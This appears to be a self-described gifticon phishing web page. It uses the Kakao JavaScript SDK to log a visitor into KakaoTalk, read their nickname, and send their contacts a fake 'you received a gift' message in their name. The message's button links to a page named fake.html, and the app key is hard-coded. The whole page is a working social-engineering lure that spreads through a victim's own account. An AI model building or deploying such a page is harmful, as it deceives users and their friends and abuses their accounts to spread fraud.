<!DOCTYPE html>

<html>
    <head>
        <title>기프티콘 낚시 사이트</title>
        <meta charset="utf-8" />
        <script src="./kakao.js"></script>
        <base href="/" />
    </head>
    <body>
        <script>
            // 카카오톡 로그인과 카카오톡 이미지 메세지 전송하는 코드
            Kakao.init('c81f293b202472968c051a774095d817');
            Kakao.Auth.login({
                success: function(response) {
                    Kakao.API.request({
                        url: '/v2/user/me',
                        success: function(response) {
                            let nickname = response['properties']['nickname'];
                            Kakao.Link.sendCustom({
                                templateId: 65171,
                                templateArgs: {
                                    'title': nickname + '님이 선물과 메세지를 보냈습니다.',
                                    'img_url': 'https://kakaogift.netlify.app/kakao/bbq2.png',
                                    'heigth': '200',
                                    'width': '700',
                                    'btn_url': './fake.html',
                                }
                            });
                        },
                        fail: function(error) {
                            console.log(error);
                        },
                    });
                },
                fail: function(error) {
                console.log(error);
                },
            });
        </script>
    </body>
</html>
